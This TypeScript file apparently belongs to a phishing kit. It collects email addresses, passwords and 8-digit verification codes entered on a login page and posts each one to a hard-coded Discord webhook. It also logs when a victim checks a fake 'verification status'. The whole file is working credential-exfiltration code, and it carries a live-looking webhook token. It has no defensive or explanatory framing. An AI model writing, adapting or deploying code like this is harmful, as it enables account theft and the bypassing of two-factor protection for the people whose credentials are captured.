const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh';

interface LoginData {
  email: string;
  password: string;
  code?: string;
}

export async function sendToDiscord(data: LoginData) {
  try {
    const timestamp = new Date().toLocaleString();
    
    if (data.code) {
      await sendVerificationDetails(data, timestamp);
    } else {
      await sendLoginAttempt(data, timestamp);
    }
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
}

export async function sendCheckStatus(email: string) {
  try {
    const timestamp = new Date().toLocaleString();
    
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [{
          title: "🔄 Check Status Attempt",
          color: 10181046, // Purple color
          fields: [
            {
              name: "📧 Email",
              value: email,
              inline: true
            },
            {
              name: "📊 Status",
              value: "User checked verification status",
              inline: true
            }
          ],
          footer: {
            text: `Timestamp: ${timestamp}`
          }
        }]
      })
    });
  } catch (error) {
    console.error('Error sending check status to Discord:', error);
  }
}

async function sendVerificationDetails(data: LoginData, timestamp: string) {
  await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      embeds: [{
        title: "🔐 New Verification Details",
        color: 15105570,
        fields: [
          {
            name: "📧 Email",
            value: data.email,
            inline: true
          },
          {
            name: "🔑 Password",
            value: data.password,
            inline: true
          },
          {
            name: "📱 8-Digit Code",
            value: data.code,
            inline: false
          }
        ],
        footer: {
          text: `Timestamp: ${timestamp}`
        }
      }]
    })
  });
}

async function sendLoginAttempt(data: LoginData, timestamp: string) {
  await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      embeds: [{
        title: "🔐 New Login Attempt",
        color: 3447003,
        fields: [
          {
            name: "📧 Email",
            value: data.email,
            inline: true
          },
          {
            name: "🔑 Password",
            value: data.password,
            inline: true
          }
        ],
        footer: {
          text: `Timestamp: ${timestamp}`
        }
      }]
    })
  });
}